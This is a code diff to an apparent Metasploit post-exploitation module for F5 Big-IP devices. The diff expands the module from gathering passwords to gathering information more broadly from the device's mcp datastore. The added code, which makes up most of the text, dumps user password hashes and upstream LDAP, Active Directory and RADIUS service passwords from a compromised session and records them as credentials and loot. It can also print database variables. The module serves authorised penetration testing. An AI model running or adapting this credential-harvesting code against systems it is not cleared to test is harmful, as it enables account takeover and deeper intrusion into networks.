@@ -12,18 +12,17 @@ class MetasploitModule < Msf::Post
     super(
       update_info(
         info,
-        'Name' => 'F5 Big-IP Gather Passwords',
+        'Name' => 'F5 Big-IP Gather Information from MCP Datastore',
         'Description' => %q{
-          This module gathers passwords from F5's mcp datastore, which is accessed
-          via /var/run/mcp on F5 Big-IP (and similar) devices.
+          This module gathers various interesting pieces of data from F5's
+          "mcp" datastore, which is accessed via /var/run/mcp using a
+          proprietary protocol.
 
-          To develop this module, I used tooling I wrote to dump *everything* from
-          mcp, then used regexes to look through ~400,000 lines of output for
-          anything that might store passwords.
+          Adapted from:  https://github.com/rbowes-r7/refreshing-mcp-tool/blob/main/mcp-getloot.rb
         },
         'License' => MSF_LICENSE,
         'Author' => ['Ron Bowes'],
-        'Platform' => ['linux'],
+        'Platform' => ['linux', 'unix'],
         'SessionTypes' => ['shell', 'meterpreter'],
         'References' => [
           ['URL', 'https://github.com/rbowes-r7/refreshing-mcp-tool'], # Original PoC
@@ -40,10 +39,48 @@ class MetasploitModule < Msf::Post
         }
       )
     )
+
+    register_options(
+      [
+        OptBool.new('GATHER_HASHES', [true, 'Gather password hashes from mcp', true]),
+        OptBool.new('GATHER_SERVICE_PASSWORDS', [true, 'Gather upstream passwords (ie, LDAP, AD, RADIUS, etc) from mcp', true]),
+        OptBool.new('GATHER_DB_VARIABLES', [true, 'Gather database variables (warning: slow)', false]),
+      ]
+    )
   end
 
-  def run
+  def gather_hashes
+    print_status('Gathering users and password hashes from mcp')
+    users = mcp_simple_query('userdb_entry')
+
+    unless users
+      print_error('Failed to query users')
+      return
+    end
+
+    loot = []
+    users.each do |u|
+      vprint_good("#{u['userdb_entry_name']} / #{u['userdb_entry_passwd']}")
+
+      create_credential(
+        jtr_format: Metasploit::Framework::Hashes.identify_hash(u['userdb_entry_passwd']),
+        origin_type: :session,
+        post_reference_name: refname,
+        private_type: :nonreplayable_hash,
+        private_data: u['userdb_entry_passwd'],
+        session_id: session_db_id,
+        username: u['userdb_entry_name'],
+        workspace_id: myworkspace_id
+      )
+      loot << "#{u['userdb_entry_name']}:#{u['userdb_entry_passwd']}"
+    end
+
+    print_good("Users and password hashes stored in #{store_loot('f5.passwords', 'text/plain', session, loot.join("\n"), nil, 'F5 Password Hashes')}")
+  end
+
+  def gather_upstream_passwords
     results = []
+    print_status('Gathering upstream passwords from mcp')
 
     vprint_status('Trying to fetch LDAP / Active Directory configuration')
     ldap_config = mcp_simple_query('auth_ldap_config')
@@ -102,5 +139,25 @@ class MetasploitModule < Msf::Post
 
       print_good("Passwords stored in #{store_loot('f5.service.passwords', 'text/plain', session, results.join("\n"), nil, 'F5 Service Passwords')}")
     end
+  end
+
+  def gather_db_variables
+    print_status('Fetching db variables from mcp (this takes a bit)...')
+    vars = mcp_simple_query('db_variable')
+
+    unless vars
+      print_error('Failed to query db variables')
+      return
+    end
+
+    vars.each do |v|
+      print_good "#{v['db_variable_name']} => #{v['db_variable_value']}"
+    end
+  end
+
+  def run
+    gather_hashes if datastore['GATHER_HASHES']
+    gather_upstream_passwords if datastore['GATHER_SERVICE_PASSWORDS']
+    gather_db_variables if datastore['GATHER_DB_VARIABLES']
   end
 end
